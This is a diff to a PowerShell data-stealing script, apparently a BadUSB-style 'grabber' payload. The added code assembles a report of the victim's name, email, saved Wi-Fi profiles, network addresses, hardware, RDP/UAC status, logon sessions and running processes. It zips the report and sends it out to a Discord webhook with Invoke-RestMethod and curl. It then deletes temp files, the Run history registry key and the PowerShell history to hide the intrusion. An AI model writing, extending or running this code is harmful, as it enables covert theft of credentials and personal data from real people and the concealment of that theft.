@@ -202,7 +202,7 @@ $WifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 $PubAddr = Invoke-WebRequest ipinfo.io/ip -UseBasicParsing
 
 #Local IP interface(s) info
-$LocalAdd =  get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
+$LocalAddr =  get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
 
 #MAC add
 $MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC
@@ -328,14 +328,159 @@ $output = @"
 #                                                                                                                 |        ''''''     ''''''     ##                  #
 ######################################################################################################################################################################
 
-Full Name: 
+Full Name: $fullName
+
+Email: $Email
+
+Local Users:
+$LUser
+
+------------------------------------------------------------------------------------------------------------------------------
+
+StartUp Folder Contents:
+$StartUp
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Nearby Wifi:
+$NearbyWifi
+
+Wifi Profiles:
+$WifiProfiles
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Network Interfaces:
+$NetInt
+
+All WLAN profile names:
+$ALLWAN
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Public IP Address:
+$PubAddr
+
+Local IP Address:
+$LocalAddr
+
+MAC Address
+$MAC
+
+------------------------------------------------------------------------------------------------------------------------------
+
+**System Information**
+
+System Info:
+$SysInfo
+
+BIOS:
+$BIOS
+
+OS Info:
+$OSInfo
+
+CPU:
+$CPU
+
+GPU:
+$GPU
+
+Motherboard:
+$MOBO
+
+System Ram Capacity:
+$RamCap
+
+Storage Drives:
+$StorageDrives
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Installed Drivers:
+$Drivers
+
+------------------------------------------------------------------------------------------------------------------------------
+
+RDP Status:
+$RDP
+
+UAC Status:
+$UAC
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Com/ Serial Devices:
+$COMDev
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Active TCP Connections:
+$ActiveTCP
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Scheduled Tasks:
+$ScheduledTasks
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Logon Sessions:
+$klist
+
+------------------------------------------------------------------------------------------------------------------------------
+
+Running Processes:
+$RunningProc
+
+**End**
 "@
 
 $output > $env:TEMP\$FolderName/Harvested.txt
+
+######################################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZipFile
 
 ######################################################################################################################################################################
 
-#Discord Upload? Here or?
+#Discord Upload
+function Upload-Discord {
 
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZipFile"}
+
+######################################################################################################################################################################
+
+#Clean UP
+#Clear temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+#Clear run history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+#Clear powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+#Clear recycle bin (not currently in use)
+#Clear-RecycleBin -Force -ErrorAction SilentlyContinue
